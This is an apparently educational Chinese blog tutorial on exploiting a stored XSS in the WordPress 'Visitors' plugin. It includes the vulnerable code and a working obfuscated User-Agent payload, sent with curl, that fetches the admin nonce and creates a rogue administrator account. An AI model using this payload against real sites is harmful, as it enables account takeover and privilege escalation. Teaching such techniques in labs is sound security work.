---
title: "利用 XSS 提權"
date: 2025-10-18
description: "在前一篇介紹 Cross-Site Scripting (XSS) 之後，讓我們來實驗一下在 Wordpress 上如何運作基本的 XSS 攻擊"
hideTOC: false
targetKeyword: XSS
draft: false
tags: 
  - "user-agent"
  - "visitors"
  - "wordpress"
  - "xss"
  - "提權"
lang: zh
---

## XSS基礎

在前一篇介紹 [[cross-site-scripting-xss-introduction|Cross-Site Scripting (XSS) 跨網站腳本漏洞]] 之後，讓我們來實驗一下在 Wordpress 上如何運作基本的 XSS 攻擊，在 Wordpress 裡有一個存在儲存式 XSS 漏洞的插件叫做"Visitors"，這個套件的主要功能是紀錄拜訪網站的使用者資料，包括 IP、來源資訊以及 User-Agent 欄位資料等等

如果讀者想要復現的話，由於 Wordpress 目前下架了這個套件，讀者可以透過這個網站下載到：[https://downloads.wordpress.org/plugin/visitors-app.0.3.zip](https://downloads.wordpress.org/plugin/visitors-app.0.3.zip)，如果我們檢查裡面的 database.php 檔案的話，我們可以找到這個套件是如何儲存資料進 Wordpress 的資料庫的

```
function VST_save_record() {
	global $wpdb;
	$table_name = $wpdb->prefix . 'VST_registros';

	VST_create_table_records();

	return $wpdb->insert(
				$table_name,
				array(
					'patch' => $_SERVER["REQUEST_URI"],
					'datetime' => current_time( 'mysql' ),
					'useragent' => $_SERVER['HTTP_USER_AGENT'],
					'ip' => $_SERVER['HTTP_X_FORWARDED_FOR']
				)
			);
}
```

這個 php 函式主要負責分析數種HTTP請求的標頭檔，包含 User-Agent 解析出來就直接儲存在 useragent 這個變數裡記錄著，接著每當網站管理員載入 Visitors 這個套件後，這個函式就會執行 start.php 這個檔案，裡面的內容如

```
$i=count(VST_get_records($date_start, $date_finish));
foreach(VST_get_records($date_start, $date_finish) as $record) {
    echo '
        <tr class="active" >
            <td scope="row" >'.$i.'</td>
            <td scope="row" >'.date_format(date_create($record->datetime), get_option("links_updated_date_format")).'</td>
            <td scope="row" >'.$record->patch.'</td>
            <td scope="row" ><a href="https://www.geolocation.com/es?ip='.$record->ip.'#ipresult">'.$record->ip.'</a></td>
            <td>'.$record->useragent.'</td>
        </tr>';
    $i--;
}
```

上面 code 的邏輯是管理員從 database 那接收到 useragent 的每一筆紀錄，而這個結構會將紀錄插進 HTML 裡的表格資料，就是 td 這個 tag 標籤，但沒有做任何的資料消毒處理，此時我們知道了該套件會收錄 User-Agent 進去資料庫，而 User-Agent 則可以由使用者來進行控管

我們便能使用這項資訊來製造XSS攻擊，最基本款的實驗是插入一組 script tag 讓瀏覽器執行 alert() 這個方法來產生跳出一個訊息，這個方法經常用在確認網頁應用程式是否存在XSS漏洞

雖說上述我們是站在白箱測試的方法上進行測試，但即便今天還不知道這個套件有這漏洞的情況下，我們也可以透過黑箱的模糊測試探索出 HTTP 標頭檔的狀態，在對該Wordpress網站全部內容不清楚的情況下我們還是可以發現一樣的漏洞

啟動 Burp Suite 工具作為 Proxy 並且先把攔截關著，請記得將瀏覽器內的代理放到 Burp Suite 裡，接著可以開啟我們要測試的網站進行攻擊，連線完進到 HTTP History 將這筆請求紀錄送到 Repeater 裡

![Forwarding-the-request-to-the-Repeater](https://media.secologies.com/Forwarding-the-request-to-the-Repeater.webp)
*[^7]*

在 Repeater 的頁面底下，我們可以變更該份請求的 User-Agent 內容，置入 script tag 放 alert 方法(<script>alert(42)</script>)，並且送出這份請求出去

![Repeater-modify-User-Agent](https://media.secologies.com/Repeater-modify-User-Agent.webp)
*[^7]*

如果 server 回傳了200的成功訊息，就代表我們可以確信已經將payload存入 Wordpress 的資料庫內了，要驗證這點，我們實驗登入 wordpress的頁面

而在我們的實驗底下，只要到 Visitors 套件的介面 http://offsecwp/wp-admin/admin.php?page=visitors-app%2Fadmin%2Fstart.php ，而這個頁面則會跳出一個警告欄位顯示 42 這個數字，便可以確認我們注入的code有成功讓瀏覽器渲染出來了

![Demonstrating-the-XSS-vulnerability](https://media.secologies.com/Demonstrating-the-XSS-vulnerability.webp)
*[^7]*

上述就是我們實驗將XSS payload注入進網頁應用服務裡的資料庫，並且只要管理員權限的帳號看到了該套件就會執行起來，簡易的警告欄位便是XSS可以很容易成功的，而不單純只能做到這樣，甚至連創建新的管理員帳號都有辦法達成

## 利用XSS提權

能夠儲存JavaScript code進目標的Wordpress服務並且執行起來，也就提供給我們更多可能性來獲得管理員權限了，如果目標的應用服務管理session機制設定的不太安全，我們可以利用XSS來竊取cookies以及session資訊，意思是如果我們偷到了已授權的使用者cookie，便可以偽裝成該用戶的身份在目標應用服務上做類似的事情

通常一個網站會用cookies來追蹤使用者的狀態以及個人資訊，其中cookies可以設定許多的標記，例如有兩種對於滲透測試員很重要的選項：Secure 以及 HttpOnly

Secure 標記會告訴我們的瀏覽器只能透過加密的通道傳輸cookie，例如只能用HTTPS協定進行溝通，這是為了避免cookie在網路上裸奔，讓有心人士可以攔截到該流量直接看到明文資訊

HttpOnly 標記則是指名瀏覽器要禁止任何 JavaScript 存取到 cookie，同理，如果網站沒有設定這個標記，我們就可以利用XSS payload來竊取到 cookie 了

我們一樣用 Wordpress 來做實驗，檢驗 wordpress 第一次登入 admin 帳號內建的 session cookies會長什麼樣子，接著我們打開網頁開發者工具，找到 Storage 頁面裡看底下的 Cookies 清單有無 http://offsecwp 紀錄

![Inspecting-WordPress-Cookies](https://media.secologies.com/Inspecting-WordPress-Cookies.webp)
*[^7]*

讀者可以注意到我們的瀏覽器儲存了六種不同的cookies，但只有四種是關於session的cookies，如果排除掉明顯是測試用的 wordpress_test_cokkie 的話，其他的cookie都支援 HttpOnly 標記

由於這些 session cookie 只能透過 HTTP 協定來進行傳送，所以從 JavaScript 來竊取到 cookie 的這條路就行不通了，我們需要來思考一下其他的路徑

回想起我們在 Visitors 套件的介面中讓管理員執行我們注入的 JavaScript payload，跳出了警告視窗，或者說可以植入更複雜的 JavaScript 函式在裡面

例如有沒有一種辦法是利用 JavaScript 函式來新增其他 Wordpress 的管理員權限帳號呢？只要原本的管理員執行到我們注入的code，就能讓函式在背景執行而不讓任何一個合法的使用者注意到

要讓這種手段收效，我們需要利用到其他種類型的網頁應用服務攻擊，像是利用Shift8[^1]這個工具建置了類似的情境，我們需要建立一個JS函式來截取 Wordpress 管理員的nonce[^2]，nonce是由伺服器產生出來的一組token，在每一筆 HTTP 請求中都會加入這個 nonce 以增加隨機性，並且避免跨網站請求偽造(Cross-Site-Request-Forgery, CSRF) 攻擊

CSRF攻擊利用社交工程讓受害者點擊惡意的連結，最終執行非使用者意願的行為，惡意的連結會用一些感覺無害的描述來偽裝，通常都想要欺騙受害者進行點擊，像是

```
<a href="http://fakecryptobank.com/send_btc?account=ATTACKER&amount=100000"">Check out these awesome cat memes!</a>
```

這個範例顯示超連結的位址指向 Fake Crypto Bank網站的API，會執行將比特幣轉移到攻擊者的帳戶裡頭，如果讀者在信箱中看到這種類型的連結，通常只能看到 HTML 中的連結描述而已，並無法看到 HTTP 請求的去向，只要攻擊者透過社交工程夠了解一個人的話，設計某些商業網站的信件寄送給您，而您的瀏覽器在該網站已經登入帳號時就有可能讓攻擊成功

而在我們的實驗中，由於 Wordpress 網站內建的偽亂數 nonce 能夠避免這類型的攻擊，而我們作為攻擊方是無法事先知道這個 token 長怎樣，但對於儲存型的 XSS 漏洞來說這個 nonce 是無法派上任何用場的

如前所述，我們要進行任何管理員權限的行為時，需要先取得 nonce，我們在實驗中可以利用以下的 JavaScript 函式

```
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

這個函式針對/wp-admin/user-new.php這個連結進行新的 HTTP 請求，並且利用正規表達式將 HTTP 回應裡的 nonce 值儲存起來，正規表達式的模板設置成抓取符合任意字元，並且在 /ser" value="字串中裡面的數值，在動態的取得了 nonce 後，便可以用主要的函式來創建新的管理員使用者帳號

```
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

利用我們獲取到的 nonce ，&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator"這段就是用來創建偽造的管理員帳號，如果這個方法成功的話，我們就能夠獲得管理員權限來存取整個 Wordpress 網站

為了確保造出來的 JavaScript payload 可以被Burp Suite跟目標應用服務正確的處理，我們需要先簡化整個函式，並且將其編碼起來，要將整個 payload 簡化成一行，我們可以利用 JS Compress[^3] 這個線上工具

![Minifying-the-XSS-attack-code](https://media.secologies.com/Minifying-the-XSS-attack-code.webp)
*[^7]*

當我們壓縮完成後，就可以將輸出結果儲存起來，再來還要編碼這簡化過後的 JavaScript code，把所有會互相干擾的字元都替換掉，之後當成 payload 來送就不會出任何錯誤，我們可以再用另一個函式來做這件事情

```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

我們的 encode_to_javascript 函式會分析簡化過的 JS 字串參數，利用 charCodeAt[^4] 將每一個字元轉換成相對應的 UTF-16 整數字元，我們把這個函式用瀏覽器的 console 來執行

![Encoding-the-Minified-JS-with-the-Browser-Console](https://media.secologies.com/Encoding-the-Minified-JS-with-the-Browser-Console.webp)
*[^7]*

我們利用 fromCharCode[^5] 方法先解碼字串，再用 eval()[^6] 方法來執行編碼過的字串，只要有編碼過的字串後我們便可以利用 curl 送出當成payload

```
kali@kali:~$ curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(118,97,114,32,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,114,101,113,117,101,115,116,85,82,76,61,34,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,110,101,119,46,112,104,112,34,44,110,111,110,99,101,82,101,103,101,120,61,47,115,101,114,34,32,118,97,108,117,101,61,34,40,91,94,34,93,42,63,41,34,47,103,59,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,71,69,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,49,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,41,59,118,97,114,32,110,111,110,99,101,77,97,116,99,104,61,110,111,110,99,101,82,101,103,101,120,46,101,120,101,99,40,97,106,97,120,82,101,113,117,101,115,116,46,114,101,115,112,111,110,115,101,84,101,120,116,41,44,110,111,110,99,101,61,110,111,110,99,101,77,97,116,99,104,91,49,93,44,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,97,116,116,97,99,107,101,114,38,101,109,97,105,108,61,97,116,116,97,99,107,101,114,64,111,102,102,115,101,99,46,99,111,109,38,112,97,115,115,49,61,97,116,116,97,99,107,101,114,112,97,115,115,38,112,97,115,115,50,61,97,116,116,97,99,107,101,114,112,97,115,115,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,40,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,41,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

但在那之前，我們要先把 Burp Suite 開著然後把攔截打開，透過 curl 送出我們製造的特殊 HTTP 請求，已經把 User-Agent 包含我們想要的惡意payload了，接著用 Burp 送出請求，我們可以在介面裡檢查送出的內容

![Inspecting-the-Attack-in-Burp](https://media.secologies.com/Inspecting-the-Attack-in-Burp.webp)
*[^7]*

確認完內容後就可以送出，記得把攔截關掉，如果沒有任何錯誤訊息的話，代表我們成功把XSS漏洞payload送進Wordpress資料庫中儲存了，我們模擬一個系統管理員帳號登入後，點到 Visitor 這個套件

![Loading-Visitors-Statistics](https://media.secologies.com/Loading-Visitors-Statistics.webp)
*[^7]*

我們注意到裡面只有一個欄位，似乎沒看到 User-Agent 的紀錄，這是因為 User-Agent 欄位包含了我們注入的 \<script\>內容，所以瀏覽器無法正常的渲染出來任何字串，而載入套件後執行完我們的payload，我們可以到使用者欄位驗證是否成功

![Confirming-that-our-Attack-Succeeded](https://media.secologies.com/Confirming-that-our-Attack-Succeeded.webp)
*[^7]*

如果多出了一組管理員的帳號出現，就代表本次 XSS 漏洞利用製造特殊的 HTTP 請求，成功的用一般使用者帳號提權得到一組高權限使用者身份了，利用這個帳號我們便能施展更進階的攻擊手段，或者針對機器底下的權限進行存  取

以上就是利用套件針對網頁應用服務的套件進行 XSS 漏洞攻擊，以利取得高權限的使用者帳號來進行更進階的手段

[^1]: shift8, "How to craft an XSS payload to create an admin user in WordPress," [https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/](https://shift8web.ca/craft-xss-payload-create-admin-user-in-wordpress-user/)

[^2]: WordPress Developer Resources, "wp_nonce_field()," [https://developer.wordpress.org/reference/functions/wp_nonce_field/](https://developer.wordpress.org/reference/functions/wp_nonce_field/)

[^3]: JSCompress, "The JavaScript Compression Tool," [https://jscompress.com/](https://jscompress.com/)

[^4]: MDN, "String.prototype.charCodeAt()," [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt)

[^5]: MDN, "String.fromCharCode()," [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode)

[^6]: MDN, "eval()," [https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)

[^7]: OffSec, "Introduction to Web Application Attacks: Privilege Escalation via XSS," The Penetration Testing with Kali Linux (PEN-200).

